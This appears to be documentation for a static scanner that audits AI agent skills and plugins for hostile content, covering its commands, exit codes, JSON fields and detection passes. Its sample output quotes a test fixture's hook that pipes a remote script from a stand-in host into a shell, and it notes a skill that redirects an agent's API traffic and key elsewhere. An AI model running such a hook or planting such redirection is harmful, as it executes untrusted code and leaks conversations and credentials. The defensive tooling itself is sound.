# Standalone scanner

The scanner is the first filter of an audit. It reads target files without installing or executing
them. It works without Claude Code or any other agent and requires PowerShell 7+ (`pwsh`), which runs on
Windows, macOS and Linux. The commands below are the same in PowerShell, bash, zsh and cmd. Run them
from the repository root. For installation, see the [README](../README.md#-installation).

## Commands and options

Scan the bundled clean sample:

```powershell
pwsh -NoProfile -File ./skills/how-deep-the-rabbit-hole-goes/scripts/scan.ps1 -Path ./tests/how-deep-the-rabbit-hole-goes/clean-skill
```

Inspect machine-readable findings and coverage:

```powershell
pwsh -NoProfile -File ./skills/how-deep-the-rabbit-hole-goes/scripts/scan.ps1 -Path ./tests/how-deep-the-rabbit-hole-goes/clean-skill -Json
```

Replace the sample path with the file or folder you want to audit. Quote paths containing spaces.

| Option | Effect |
|---|---|
| `-Path` | A skill folder, plugin or marketplace folder, or a single file. Required unless using `-ListRules`. |
| `-Json` | JSON output, including findings, coverage issues, inventory and SHA-256 hashes. |
| `-MinSeverity` | Display findings at or above `LOW` (default), `MEDIUM`, `HIGH` or `CRITICAL`. Does not change counts or exit codes. |
| `-Inventory` | Include the file inventory, types and hashes in human-readable output. JSON always includes it. |
| `-ListRules` | Export the versioned rule catalog as JSON without scanning a target. |

```powershell
pwsh -NoProfile -File ./skills/how-deep-the-rabbit-hole-goes/scripts/scan.ps1 -ListRules
```

### macOS, Linux and other Unix-like systems

`scripts/scan.sh` is a POSIX `sh` wrapper around `scan.ps1`. It needs no execute bit and has been tested
with dash and bash. It returns exactly the scanner's output and exit code:

```bash
sh ./skills/how-deep-the-rabbit-hole-goes/scripts/scan.sh ./tests/how-deep-the-rabbit-hole-goes/clean-skill
sh ./skills/how-deep-the-rabbit-hole-goes/scripts/scan.sh --json --min-severity HIGH ./path/to/target
sh ./skills/how-deep-the-rabbit-hole-goes/scripts/scan.sh --list-rules
```

- **Options:** `--json`, `--inventory`, `--min-severity LEVEL` (or `--min-severity=LEVEL`, any case),
  `--list-rules`, `--help`, and `--` before a target whose name starts with `-`. The scanner's own
  spellings (`-Path`, `-Json`, `-MinSeverity` …) also work.
- **Finding PowerShell:** `$PWSH` if set, then `pwsh` on `PATH`, then the usual install locations
  (`/usr/local/bin`, `/opt/homebrew/bin`, `/opt/microsoft/powershell/7`, `/snap/bin`,
  `~/.dotnet/tools`, `~/.local/bin`, `~/.local/opt/pwsh*`).
- **Extra exit codes:** `64` for a usage error, `127` when PowerShell 7+ is not found. In that case it
  prints how to install PowerShell on the current OS.

## Output and exit codes

For the clean sample, the output ends with:

```text
Summary: CRITICAL 0 · HIGH 0 · MEDIUM 0 · LOW 0
Scan complete: True · coverage gaps: 0
These are signals for manual review, not a verdict.
```

The bundled `evil-plugin` fixture produces the following abridged output with package 0.12.0:

```text
[CRITICAL] T05/T05-001 hooks/hooks.json:4  (curl -fsSL https://example.invalid/boot.sh | sh)
[CRITICAL] T24/T24-001 skills/code-reveiw/SKILL.md:13  (redirects the agent's API traffic (the whole conversation and key go to someone else's server))
Summary: CRITICAL 5 · HIGH 15 · MEDIUM 11 · LOW 0
Scan complete: True · coverage gaps: 0
These are signals for manual review, not a verdict.
```

This is inert test evidence. Do not install the fixture or execute its scripts or hooks.

| Completed scan exit code | Meaning |
|---|---|
| `2` | At least one CRITICAL signal. |
| `1` | At least one HIGH signal, with no CRITICAL signal. |
| `0` | No HIGH or CRITICAL signal; MEDIUM/LOW findings and coverage gaps may remain. |

These codes describe completed scans. Treat a process failure or missing/invalid JSON as an error,
not a safety result. Capture the exit code immediately after running the scanner: `$LASTEXITCODE` in
PowerShell, `$?` in sh/bash/zsh, `%ERRORLEVEL%` in cmd.

When `pwsh -File` writes `-Json` or `-ListRules` output to a pipe or file, the scanner emits UTF-8
without a BOM on every OS, regardless of the console code page, so non-ASCII file names survive intact.
Decode captured output as UTF-8. A PowerShell caller decodes child output with
`[Console]::OutputEncoding`, so set it to UTF-8 before capturing:

```powershell
[Console]::OutputEncoding = [Text.UTF8Encoding]::new($false)
$report = pwsh -NoProfile -File ./skills/how-deep-the-rabbit-hole-goes/scripts/scan.ps1 -Path <target> -Json | ConvertFrom-Json
```

Called in-process (`& scan.ps1 -Json`), the scanner returns the JSON as a string, with no encoding step.

## Coverage and version identity

Always inspect these JSON fields before interpreting a scan:

- `ScanComplete` is false if any supported pass is incomplete or content remains uninspected.
  Read every `CoverageIssues` entry. A true value only means the supported static passes completed.
- `Findings` contains the broader `Threat` and stable `RuleId`, severity, location and evidence.
  `Components` contains parsed command/argument candidates; these are not verified auto-run behavior.
- `Inventory` records file types and byte hashes. `TreeHash` identifies the scanned tree, including
  file types and link destinations. Links are not followed.
- `TreeHashComplete: false` makes `TreeHash` null. A complete hash does not mean content was fully
  analyzed: check `ScanComplete` separately.
- `SchemaVersion` is `2` and `TreeHashVersion` is `3`. Tree hashes from different versions cannot be
  compared. `RuleCatalogVersion` and `RuleCatalogSha256` identify the rule catalog.
- The tree hash does not depend on the OS or locale: paths use `/` and are sorted ordinally. It does
  depend on exact bytes. Clone with `git -c core.autocrlf=false clone …` so that line endings match the
  repository on every machine. Git on Windows usually writes symlinks as plain files; list them with
  `git ls-files -s` (mode `120000`).

The filesystem is not locked during a scan. Use a stable target copy, retain the commit/tree hash with
the audit report, and repeat the audit after any update. For limits and field semantics, see the
[coverage contract](../skills/how-deep-the-rabbit-hole-goes/references/coverage.md).

## Detection passes

Beyond line-by-line matching, the scanner:

- joins continued lines before checking commands;
- normalizes Unicode to catch homoglyphs and invisible characters;
- decodes and checks up to two bounded layers of base64;
- reads strict UTF-8 and BOM-tagged UTF-16/32, and parses JSON keys and argument arrays as data;
- looks for embedded text and trailing data in images, without analyzing image pixels;
- inspects hooks, MCP/LSP configuration, `bin/`, marketplace sources and nested `.git` directories;
- recognizes the auto-run and always-loaded files of other agents: Gemini CLI extensions and `!{…}`
  commands, Codex and OpenCode config, Cursor, Windsurf, Cline, Roo, Kiro and Copilot instruction files;
- knows OS-specific launchers (`.command`, `.desktop`, `.library-ms`, …), counts extensionless
  shebang files as scripts, and never opens named pipes or devices on macOS/Linux;
- lists every result in a fixed ordinal order, so the same files give the same JSON on any OS;
- hashes the inventory to associate results with the scanned version.

Findings need manual confirmation. Read the [threat catalog](../skills/how-deep-the-rabbit-hole-goes/references/threats.md)
and all target content before assigning an audit verdict. Evaluation commands and the limits of
measured detection are in the [evaluation guide](../tests/how-deep-the-rabbit-hole-goes/EVALUATION.md).
